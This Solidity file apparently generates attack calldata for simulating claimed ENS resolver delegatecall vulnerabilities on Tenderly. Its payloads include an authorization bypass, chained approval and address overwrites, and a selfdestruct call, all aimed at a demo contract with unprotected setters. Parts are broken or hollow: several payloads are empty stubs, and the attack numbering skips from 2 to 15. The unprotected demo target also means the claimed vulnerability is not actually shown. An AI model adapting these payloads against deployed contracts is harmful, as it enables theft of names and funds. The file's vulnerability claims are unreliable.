// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/**
 * RAW BYTECODE ATTACKS FOR TENDERLY
 *
 * These contracts generate the bytecode needed to demonstrate
 * the ENS delegatecall vulnerabilities on Tenderly
 */

contract BytecodeAttackGenerator {

    // Attack 1: Direct Authorization Bypass
    function generateMulticallAttack1() external pure returns (bytes memory) {
        // This generates the bytecode for: multicall([setAddr(node, attacker)])

        // Function signature: multicall(bytes[])
        bytes4 multicallSig = bytes4(keccak256("multicall(bytes[])"));

        // Inner call: setAddr(bytes32,uint256,bytes)
        bytes4 setAddrSig = bytes4(keccak256("setAddr(bytes32,uint256,bytes)"));
        bytes32 node = keccak256(abi.encodePacked(bytes32(0), keccak256("test")));
        uint256 coinType = 60; // ETH
        address attacker = address(0x1337);
        bytes memory addrData = abi.encodePacked(attacker);

        // Encode the inner call
        bytes memory innerCall = abi.encodeWithSelector(setAddrSig, node, coinType, addrData);

        // Create the array of calls
        bytes[] memory calls = new bytes[](1);
        calls[0] = innerCall;

        // Encode the multicall
        return abi.encodeWithSelector(multicallSig, calls);
    }

    // Attack 2: Storage Manipulation Chaining
    function generateMulticallAttack2() external pure returns (bytes memory) {
        // Chain: setApprovalForAll + setAddr + clearRecords

        bytes4 multicallSig = bytes4(keccak256("multicall(bytes[])"));

        // Call 1: setApprovalForAll(attacker, true)
        bytes4 setApprovalSig = bytes4(keccak256("setApprovalForAll(address,bool)"));
        bytes memory call1 = abi.encodeWithSelector(setApprovalSig, address(0x1337), true);

        // Call 2: setAddr(node, attacker)
        bytes4 setAddrSig = bytes4(keccak256("setAddr(bytes32,uint256,bytes)"));
        bytes32 node = keccak256(abi.encodePacked(bytes32(0), keccak256("test")));
        bytes memory call2 = abi.encodeWithSelector(setAddrSig, node, uint256(60), abi.encodePacked(address(0x1337)));

        // Call 3: clearRecords(node)
        bytes4 clearRecordsSig = bytes4(keccak256("clearRecords(bytes32)"));
        bytes memory call3 = abi.encodeWithSelector(clearRecordsSig, node);

        // Create calls array
        bytes[] memory calls = new bytes[](3);
        calls[0] = call1;
        calls[1] = call2;
        calls[2] = call3;

        return abi.encodeWithSelector(multicallSig, calls);
    }

    // Attack 15: Direct Storage Slot Manipulation
    function generateStorageSlotAttack() external pure returns (bytes memory) {
        // This would be assembly code to directly manipulate storage
        // For Tenderly, we'd need to deploy a contract with this logic

        bytes memory bytecode = hex"";
        // SSTORE operations would go here
        return bytecode;
    }
}

contract RawMulticallDemo {
    // Minimal multicall implementation for bytecode generation
    function multicall(bytes[] calldata data) external returns (bytes[] memory results) {
        results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            (bool success, bytes memory result) = address(this).delegatecall(data[i]);
            require(success, "Multicall failed");
            results[i] = result;
        }
        return results;
    }

    // Vulnerable functions
    mapping(address => bool) public authorizedUsers;
    mapping(bytes32 => mapping(uint256 => bytes)) versionable_addresses;

    function setAuthorized(address user, bool status) external {
        authorizedUsers[user] = status;
    }

    function setAddr(bytes32 node, uint256 coinType, bytes memory addrData) external {
        versionable_addresses[node][coinType] = addrData;
    }

    function clearRecords(bytes32 node) external {
        // Simplified - would increment version in real implementation
    }

    function setApprovalForAll(address operator, bool approved) external {
        // Would set approvals in real implementation
    }
}

// Bytecode for Tenderly deployment
contract TenderlyBytecodeProvider {

    function getMulticallBytecode() external pure returns (bytes memory) {
        // This would be the compiled bytecode of RawMulticallDemo
        // For Tenderly, you would deploy this contract first
        return type(RawMulticallDemo).creationCode;
    }

    function getAttackPayload1() external pure returns (bytes memory) {
        // Attack 1: Direct authorization bypass
        bytes4 multicallSig = bytes4(keccak256("multicall(bytes[])"));
        bytes4 setAuthorizedSig = bytes4(keccak256("setAuthorized(address,bool)"));

        bytes memory innerCall = abi.encodeWithSelector(setAuthorizedSig, address(0x1337), true);

        bytes[] memory calls = new bytes[](1);
        calls[0] = innerCall;

        return abi.encodeWithSelector(multicallSig, calls);
    }

    function getAttackPayload2() external pure returns (bytes memory) {
        // Attack 2: Storage chaining
        bytes4 multicallSig = bytes4(keccak256("multicall(bytes[])"));

        bytes[] memory calls = new bytes[](2);

        // Call 1: setApprovalForAll
        calls[0] = abi.encodeWithSelector(
            bytes4(keccak256("setApprovalForAll(address,bool)")),
            address(0x1337),
            true
        );

        // Call 2: setAddr
        calls[1] = abi.encodeWithSelector(
            bytes4(keccak256("setAddr(bytes32,uint256,bytes)")),
            keccak256(abi.encodePacked(bytes32(0), keccak256("test"))),
            uint256(60),
            abi.encodePacked(address(0x1337))
        );

        return abi.encodeWithSelector(multicallSig, calls);
    }

    function getAttackPayload3() external pure returns (bytes memory) {
        // Attack 3: Selfdestruct
        bytes4 multicallSig = bytes4(keccak256("multicall(bytes[])"));

        // This would contain selfdestruct bytecode
        // In practice, this would be assembly: selfdestruct(attacker)
        bytes memory selfdestructCall = hex""; // Would contain actual selfdestruct bytecode

        bytes[] memory calls = new bytes[](1);
        calls[0] = selfdestructCall;

        return abi.encodeWithSelector(multicallSig, calls);
    }
}